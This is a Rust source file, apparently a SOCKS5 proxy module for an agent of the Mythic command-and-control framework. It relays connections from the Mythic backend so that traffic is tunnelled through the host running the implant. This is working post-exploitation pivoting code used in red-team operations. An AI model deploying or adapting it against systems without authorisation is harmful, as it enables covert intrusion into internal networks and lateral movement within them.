use crate::{mythic_error, mythic_success, mythic_continued};
use std::result::Result;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{mpsc, Weak};
use std::{error::Error, sync::Arc};
use serde_json::Value;
use tokio::{
    net::TcpStream,
    runtime::Runtime,
};
use tokio::io::{AsyncReadExt, AsyncWriteExt, AsyncWrite, split, WriteHalf, ReadHalf};
use tokio::task::JoinHandle;
use std::io::{self, ErrorKind};
use tokio::sync::Mutex;
use std::collections::HashMap;
use std::net::{Ipv4Addr, Ipv6Addr, IpAddr, SocketAddr, ToSocketAddrs};
use std::convert::TryInto;
use tokio::sync::mpsc::{Receiver, Sender};
use serde::{Deserialize, Serialize};

/// Struct for parsing the arguments of the `portfwd` command parameters
#[derive(Debug, Deserialize, Serialize)]
pub struct SocksMsg {
    exit: bool,
    server_id: usize,
    data: String,
}

#[derive(Debug, Deserialize)]
struct CmdParams {
    action: CmdAction,
    port: u16
}
#[derive(Debug, Deserialize)]
#[serde(rename_all = "lowercase")]
enum CmdAction {
    Start,
    Stop
}

/// Create a backgroud task for socks
pub fn task_socks(
    parameters: &str,
    uuid: String,
    socks_from_backend: &mut Option<Sender<SocksMsg>>,
    socks_to_backend: &mut Option<Receiver<SocksMsg>>,
) -> Result<Option<(Arc<AtomicBool>, mpsc::Sender<Value>, mpsc::Receiver<Value>)>, Box<dyn Error>> {

    let parameters: CmdParams = serde_json::from_str(parameters)?;
    match parameters.action
    {
        CmdAction::Start => {
            // Create async channels to get and send messages between Agent and (Socks) Runtime
            let (snd_from_mythic,recv_from_mythic) = tokio::sync::mpsc::channel(1024);
            let (snd_to_mythic,recv_for_mythic) = tokio::sync::mpsc::channel(1024);
            *socks_from_backend = Some(snd_from_mythic);
            *socks_to_backend = Some(recv_for_mythic);

            // Create a sync channel to report errors to Mythic
            let (tx, rx) = mpsc::channel();

            // Create a new flag indicating that the task is running
            let running = Arc::new(AtomicBool::new(true));
            let keep_running = Arc::downgrade(&running);

            let ttx = tx.clone();

            tx.send(mythic_continued!(
                uuid,
                "SOCKS ready",
                "SOCKS ready"
            ))?;

            // Spawn a new thread for the background task
            std::thread::spawn(move || {
                // Invoke the callback function
                if let Err(e) = setup_socks(snd_to_mythic, recv_from_mythic, keep_running.clone()) {
                    // If the function returns an error, relay the error message back to Mythic
                    let _ = ttx.send(mythic_error!(uuid, e.to_string()));
                }else{
                    let _ = ttx.send(mythic_success!(uuid, "SOCKS finished"));
                }
                // Once the task ends, mark it as not running
                if let Some(running) = keep_running.upgrade() {
                    running.store(false, Ordering::SeqCst);
                }
            });
    
            // Append this new task to the Vec of background tasks
            Ok(Some(
                (
                    running,
                    tx,
                    rx,
            )))
        },
        CmdAction::Stop => {
            *socks_from_backend = None;//Droping this will end the loop
            *socks_to_backend = None;
            Ok(None)
        }
    }
}

/// Runs a async socks server
fn setup_socks(
    snd_to_mythic: Sender<SocksMsg>,
    mut recv_from_mythic: Receiver<SocksMsg>,
    keep_running: Weak<AtomicBool>
) -> Result<(), Box<dyn Error>> {
    // Initialize a new async runtime
    let rt = Runtime::new()?;

    // Start the async runtime
    rt.block_on(async {
        let client_sockets: Arc<Mutex<HashMap<usize, Client>>> = Arc::new(Mutex::new(HashMap::new()));
        
        // Loop continuously until the sender (from mythic) is droped
        loop {
            if keep_running.strong_count() == 0 {
                //background task was killed
                break;
            }
            let msg = if let Some(msg) = recv_from_mythic.recv().await {
                msg
            }else{
                break;
            };
            let data = base64::decode(msg.data)?;
            let id = msg.server_id;

            let (new, op) = if let Some(c) = client_sockets.lock().await.get_mut(&id){
                (false, match c {
                    Client::Connecting(jh) => {
                        jh.abort();
                        Err(io::Error::new(ErrorKind::NotConnected,""))
                    },
                    Client::Connected(csock) => {
                        write_to_client(csock, &data).await
                    },
                })
            }else{
                //new client
                (true, Ok(()))
            };
            if let Err(_e) = op {
                //client error
                client_sockets.lock().await.remove(&id);
                write_mplx_data(id, true, &[], &snd_to_mythic).await?;
            }
            if new {
                //new client
                let jh = tokio::spawn(connect_request(id,
                    snd_to_mythic.clone(),
                    data,
                    client_sockets.clone(),
                    keep_running.clone()));
                client_sockets.lock().await.insert(id, Client::Connecting(jh));
            }
            if msg.exit {
                if let Some(c) = client_sockets.lock().await.remove(&id){
                    match c {
                        Client::Connecting(jh) => {
                            jh.abort();
                        },
                        Client::Connected(mut csock) => { //todo does this close reading too?
                            let _ = csock.shutdown().await;
                        },
                    }
                }                
            }
        }
        Ok(())
    })
}

/// send a bob of data to a local endpoint
async fn write_to_client<W: AsyncWrite+Unpin>(csock: &mut W, data: &[u8]) -> io::Result<()> {
    csock.write_all(data).await?;
    csock.flush().await?;
    Ok(())
}
/// send a blob of data back to mythic
async fn write_mplx_data(server_id: usize, exit: bool, data: &[u8], backend_w: &Sender<SocksMsg>) -> io::Result<()> {

    let args = SocksMsg {
        exit,
        server_id,
        data: base64::encode(data),
    };
    backend_w.send(args).await.map_err(|_|io::Error::new(io::ErrorKind::BrokenPipe, "backend closed"))?;
    Ok(())
}
enum Client {
    Connecting(JoinHandle<()>),
    Connected(WriteHalf<TcpStream>)
}
/// parse and handle new socks connection
async fn connect_request(id: usize,
    backend_w: Sender<SocksMsg>,
    mut data: Vec<u8>,
    client_sockets: Arc<Mutex<HashMap<usize, Client>>>,
    keep_running: Weak<AtomicBool>
) {
    //socks auth is done by mythic (no auth)
    //now process the connect request
    match socks_connect(&data).await {
        Ok(client_stream) => {
            data[1]=0;
            write_mplx_data(id, false, &data, &backend_w).await.expect("link down");
            let (client_r, cwrite) = split(client_stream);
            
            client_sockets.lock().await.insert(id, Client::Connected(cwrite));

            read_from_client(id, client_r, &backend_w, keep_running).await;
        }
        Err(socks_err_no) => {
            write_mplx_data(id, true, &[5, socks_err_no], &backend_w).await.expect("link down");
        }
    }
}
/// parse DNS name + port
async fn socks_dns(data: &[u8]) -> io::Result<SocketAddr> {
    let len = data[0] as usize;
    if data.len() != len+3 {return Err(io::Error::new(
        ErrorKind::UnexpectedEof,
        "no valid name"
        ));}

    let portb : [u8;2] = data[len+1..].try_into().unwrap(); //safe: len checked

    (
        std::str::from_utf8(&data[1..len+1]).map_err(|_|{
            io::Error::new(ErrorKind::InvalidInput,"")
        })?,
        u16::from_be_bytes(portb)
    ).to_socket_addrs()?.next().ok_or(io::Error::new(ErrorKind::NotFound,""))
}
/// parse IPv6+Port
async fn socks_ipv6(data: &[u8]) -> io::Result<SocketAddr> {
    if data.len() < 18 {return Err(io::Error::new(
        ErrorKind::UnexpectedEof,
        "no IPv6"
        ));}
    
        let ipb : [u8;16] = data[0..16].try_into().unwrap(); //safe: len checked
        let portb : [u8;2] = data[16..18].try_into().unwrap(); //safe: len checked

        Ok(SocketAddr::new(IpAddr::V6(
            Ipv6Addr::from(ipb)),
            u16::from_be_bytes(portb)
        ))
}
/// parse IPv4+Port
async fn socks_ipv4(data: &[u8]) -> io::Result<SocketAddr> {
    if data.len() < 6 {return Err(io::Error::new(
    ErrorKind::UnexpectedEof,
    "no IPv4"
    ));}

    let ipb : [u8;4] = data[0..4].try_into().unwrap(); //safe: len checked
    let portb : [u8;2] = data[4..6].try_into().unwrap(); //safe: len checked

    Ok(SocketAddr::new(IpAddr::V4(
        Ipv4Addr::from(ipb)),
        u16::from_be_bytes(portb)
    ))
}
/// process the socks connect request
async fn socks_connect(data: &[u8]) -> Result<TcpStream, u8> {
    if data.len() < 4 {return Err(1);}
    if data[0]!=5 {return Err(1);}
    if data[2]!=0 {return Err(1);}
    
    let addr = match match data[3] {
        1 => socks_ipv4(&data[4..]).await,
        3 => socks_dns(&data[4..]).await,
        4 => socks_ipv6(&data[4..]).await,
        _ => {return Err(8);}
    }{
        Ok(sa) => sa,
        Err(_io_err) => return Err(1)
    };

    match data[1] {
        1 => { //TCP connect
            TcpStream::connect(addr).await.map_err(|op|{
                //eprintln!("{:?}",op);
                match op.kind() {
                    ErrorKind::ConnectionRefused => 5,
                    ErrorKind::ConnectionReset => 5,
                    ErrorKind::ConnectionAborted => 5,
                    _ => 1
                }
            })
        },
        2 => { //TCP bind
            //Two socks answeres
            //1. the bind addr
            //2. the connecting client
            Err(7)
        },
        3 => { //UDP
            Err(7)
        },
        _ => Err(7)
    }
}
/// read data from the local connection and send it to mythic
async fn read_from_client(
    id:usize,
    mut client_r : ReadHalf<TcpStream>,
    backend_w: &Sender<SocksMsg>,
    keep_running: Weak<AtomicBool>) {
    let mut buffer : [u8; 8192] = [0; 8192];
    loop {
        if keep_running.strong_count() == 0 {
            //background task was killed
            break;
        }
        let n = match client_r.read(&mut buffer).await {
            Ok(0) => break,
            Ok(n) => n,
            Err(_e) => break
        };
        if let Err(_e) = write_mplx_data(id, false, &buffer[..n], backend_w).await {
            //backend gone -> close
            return;
        }
    }
    let _ = write_mplx_data(id, true, &[], backend_w).await;
    //backend gone, but we are closing anyway
}
